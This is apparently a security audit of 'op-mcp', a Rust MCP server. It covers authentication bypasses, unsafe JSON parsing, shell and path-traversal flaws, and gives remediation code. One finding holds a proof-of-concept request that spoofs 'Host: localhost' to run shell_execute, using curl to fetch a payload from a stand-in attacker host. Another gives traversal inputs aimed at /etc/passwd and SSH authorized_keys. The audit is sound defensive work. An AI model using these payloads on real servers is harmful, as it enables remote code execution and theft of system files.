# Production Security and Quality Audit: op-mcp

---

## 1. Executive Summary

This security and quality audit evaluates the `op-mcp` crate, a Model Context Protocol (MCP) server implementation. The codebase exhibits a highly modular transport architecture (Stdio, HTTP, SSE, WebSocket, and gRPC) and multiple runtime modes. However, the audit revealed **critical, directly exploitable vulnerabilities** that compromise the host system's security, bypass authentication mechanisms entirely, and threaten memory safety. 

Additionally, we identified architectural deviations from schema-as-code paradigms and local storage persistence best practices.

---

## 2. Critical Security Findings

### CRITICAL: Authentication Bypass via Client-Controlled `Host` Header
- **Location:** `crates/op-mcp/src/transport/http.rs:67-73` (invoking `is_localhost_host` defined at `crates/op-mcp/src/transport/http.rs:48-57`)
- **Impact:** Remote Code Execution (RCE) / Full System Compromise.
- **Description:** The `wireguard_auth_middleware` permits unauthenticated access to all endpoints (including tool listing and execution) if `is_localhost_host` evaluates to `true`. This helper checks the `Host` header of the incoming HTTP request. Because the `Host` header is entirely controlled by the client, a remote attacker can bypass authentication by simply sending requests with `Host: localhost` or `Host: 127.0.0.1`.
- **Proof of Concept (Conceptual):**
  ```http
  POST /mcp HTTP/1.1
  Host: localhost
  Content-Type: application/json

  {
    "jsonrpc": "2.0",
    "id": 1,
    "method": "tools/call",
    "params": {
      "name": "shell_execute",
      "arguments": {
        "command": "curl",
        "args": ["http://attacker.com/payload.sh", "-o", "/tmp/payload.sh"]
      }
    }
  }
  ```

---

### CRITICAL: Complete Lack of Authentication on WebSocket Transport
- **Location:** `crates/op-mcp/src/transport/websocket.rs:46-63`
- **Impact:** Unauthenticated remote tool execution (including filesystem mutations and shell commands).
- **Description:** Unlike the HTTP and SSE transports, which apply the `wireguard_auth_middleware` layer, the `WebSocketTransport` router is constructed and served without any authentication middleware. Any network-adjacent attacker can open a WebSocket connection to `ws://<ip>:3002/ws` and execute arbitrary system-level tools.

---

### CRITICAL: Memory Safety Violation via `unsafe { simd_json::from_str }` on Untrusted Strings
- **Location:** 
  - `crates/op-mcp/src/transport/websocket.rs:124`
  - `crates/op-mcp/src/transport/stdio.rs:52`
  - `crates/op-mcp/src/agents_main.rs:592`
- **Impact:** Undefined Behavior, memory corruption, and Denial of Service (DoS) crashes.
- **Description:** The codebase processes untrusted external strings (from WebSocket messages and stdin lines) using `unsafe { simd_json::from_str(...) }`. The `simd-json` crate has strict prerequisites for safe parsing: the input buffer **must** be mutable and have at least 32 bytes of padding at the end. Standard `String` or `str` buffers allocated from network read loops or stdin lines do not guarantee this padding. Passing them directly to `unsafe` parsing routines causes `simd-json` to perform out-of-bounds reads/writes, leading to memory corruption or segmentation faults.

---

### CRITICAL: Arbitrary Command Arguments Execution in `ShellExecuteTool`
- **Location:** `crates/op-mcp/src/tools/shell.rs:49-78`
- **Impact:** Remote Code Execution (RCE) with privilege level of the running process.
- **Description:** `ShellExecuteTool` validates that the root command is contained in a hardcoded whitelist (such as `python3`, `node`, `cargo`, `docker`). However, it performs absolutely no validation or filtering on the `args` array. An attacker can pass arbitrary code scripts to interpreters like `python3` or `node`, write files to disk via `npm`/`cargo` lifecycle hooks, or mount/execute arbitrary containers via `docker` or `kubectl`.

---

### CRITICAL: Evasion of Blocked Patterns in Compact Mode Request Handler
- **Location:** `crates/op-mcp/src/request_handler.rs:325-331` (loading via `crates/op-mcp/src/request_handler.rs:223`)
- **Impact:** Execution of restricted system-level tools despite system configuration blocklist.
- **Description:** The standard `McpServer` implements `is_tool_blocked` to filter out system mutation tools (like `shell_execute` and `systemd_start`). However, the `RequestHandler` used for the alternative compact mode bypasses these blocks. It registers `ShellExecuteTool` directly inside its `load_tools` routine, and the meta-tool handler `meta_execute_tool` immediately passes the target execution command to `ctx.execute_tool` without checking any blocklists.

---

### HIGH: Insufficient Path Traversal Protection in Filesystem Tools
- **Location:** `crates/op-mcp/src/tools/filesystem.rs:44-50` and `crates/op-mcp/src/tools/filesystem.rs:75-78`
- **Impact:** Unauthorized read/write of sensitive files (e.g., configurations, private keys, cron jobs).
- **Description:** Path validation checks rely entirely on basic `starts_with` logic applied to raw, un-canonicalized path strings. An attacker can easily bypass the `/etc/shadow` restriction using directory traversal sequences (e.g., `"/etc/shadow/../../etc/passwd"`) or relative links. Furthermore, `write_file` only restricts writing to `/etc/` and `/boot/`, allowing attackers to write files to `/root/.ssh/authorized_keys` or directory structures containing user shell configurations.

---

## 3. Dependencies & Feature Inventory

### Direct Dependencies (from `crates/op-mcp/Cargo.toml` & Workspace)

| Dependency | Version Specified | Enabled Features (Explicit / Default) | Risk Status / Warnings |
| :--- | :--- | :--- | :--- |
| `anyhow` | `"1.0"` | Default features | Standard |
| `async-trait` | `"0.1"` | Default features | Standard |
| `chrono` | `"0.4"` | `["serde"]` (via workspace) | Standard |
| `serde` | `"1.0"` | `["derive"]` | Standard |
| `simd-json` | Workspace | `["serde", "serde_impl"]` (via workspace) | **Unsafe Usage Flagged** |
| `thiserror` | `"1.0"` | Default features | Standard |
| `tracing` | `"0.1"` | Default features | Standard |
| `tracing-subscriber`| `"0.3"` | Default features | Standard |
| `tokio` | `version = "1.0"` | `["full"]` | Pulls in highly permissive feature set |
| `tokio-stream` | `"0.1"` | `["sync"]` | Standard |
| `futures` | `"0.3"` | Default features | Standard |
| `uuid` | `"1.0"` | `["v4"]` | Standard |
| `prost-types` | Workspace | Default features | Standard |
| `axum` | `"0.7"` | `["ws"]` | Standard |
| `tower-http` | `"0.5"` | `["cors"]` | Standard |
| `reqwest` | Workspace | `["json", "stream"]` (via workspace) | Standard |
| `zbus` | `"4.0"` | Default features | Standard |
| `clap` | `"4.0"` | `["derive"]` | Standard |
| `tonic` | Workspace (Opt) | `["tls", "tls-roots", "tls-webpki-roots"]` (via workspace) | Standard |
| `prost` | Workspace (Opt) | Default features | Standard |

### Crate-Local Features Table
- **`default`**: No features enabled by default.
- **`op-chat`**: Activates direct bindings to chat execution interfaces.
- **`code_search`**: Enables intelligent syntax injection during tool execution (`crates/op-mcp/src/server.rs:260-279`).
- **`grpc`**: Gates compiling `crates/op-mcp/src/grpc/` and pulls in `tonic`, `prost`, and `tonic-build`.

---

## 4. Schema-as-Code Compliance Gap

The project violates the unified schema-as-code discipline by defining multiple ad-hoc structs and unstructured, raw JSON types instead of deriving them from Protocol Buffers or versioned OSCAL schemas.

### Violations Identified
1. **Ad-hoc JSON-RPC Struct Definitions**
   - **Citations:** `crates/op-mcp/src/agents_main.rs:27-89` and `crates/op-mcp/src/protocol.rs:12-108`
   - **Gap:** `JsonRpcRequest`, `JsonRpcResponse`, `McpRequest`, and `McpResponse` are hand-rolled as arbitrary Rust structures containing generic, untyped JSON values (`simd_json::OwnedValue`). They are not generated from schema definitions.
2. **Hardcoded Input Parameter Schemas**
   - **Citations:** 
     - `crates/op-mcp/src/agents_main.rs:105-330`
     - `crates/op-mcp/src/compact.rs:390-456`
     - `crates/op-mcp/src/server.rs:444-486`
     - `crates/op-mcp/src/tools/filesystem.rs:27-33`
   - **Gap:** Tool argument restrictions are manually declared inside code files as unvalidated JSON-Schema structures via `simd_json::json!` macros. Changes to tool signatures are not tracked in centralized schema definitions.

---

## 5. Storage Backend Check

| Backend | Found at File:Line | Role | Architectural Violation? |
| :--- | :--- | :--- | :--- |
| **In-Memory HashMap** | `crates/op-mcp/src/builtin_trait_agents.rs:20` | Ad-hoc Memory Agent KV Store | **Yes**: Bypasses centralized `op-cozo-store` or `op-cache` storage. |
| **In-Memory Vec** | `crates/op-mcp/src/builtin_trait_agents.rs:186` | Ad-hoc Sequential Thinking history | **Yes**: State is lost across server restarts or gateway crashes. |
| **Local Cache Directories** | `crates/op-mcp/src/grpc/server.rs:43` | File-based cache path (`/var/lib/op-dbus/cache`) | No (Infrastructure configuration) |
| **Local SQLite File** | `crates/op-mcp/src/grpc/server.rs:44` | State persistence configuration | No |

---

## 6. Corrective Action Plan

### 1. Fix Authentication Bypass in HTTP Transport
Replace the vulnerable `Host` header inspection with validation of the TCP source socket address (`ConnectInfo` in axum) to guarantee that bypasses are only granted to actual loopback connections (`127.0.0.1` or `::1`).
```rust
// Corrected verification
let remote_ip = request.extensions().get::<axum::extract::ConnectInfo<std::net::SocketAddr>>()
    .map(|info| info.0.ip());

if let Some(ip) = remote_ip {
    if !ip.is_loopback() {
        return Err(StatusCode::UNAUTHORIZED);
    }
}
```

### 2. Fix Memory Safety Issues in JSON Parsers
Remove all instances of `unsafe { simd_json::from_str }` on untrusted slices. Replace with safe, copy-based parsing `simd_json::from_slice` or allocate memory on the heap using a padded buffer before executing SIMD operations.

### 3. Canonicalize All File Paths
Before verifying paths in any filesystem utilities, resolve all symbolic links and relative path steps using `tokio::fs::canonicalize`.
```rust
let canonical_path = tokio::fs::canonicalize(raw_path).await?;
if !canonical_path.starts_with("/allowed/directory/") {
    return Err(anyhow::anyhow!("Access denied"));
}
```

### 4. Align with Schema-as-Code Discipline
Generate all JSON-RPC parameters and MCP messages using the existing protobuf compilation framework configured inside `crates/op-mcp/src/grpc/generated/op.mcp.v1.rs`. Ensure that tool parameters are parsed against compile-time verified structures.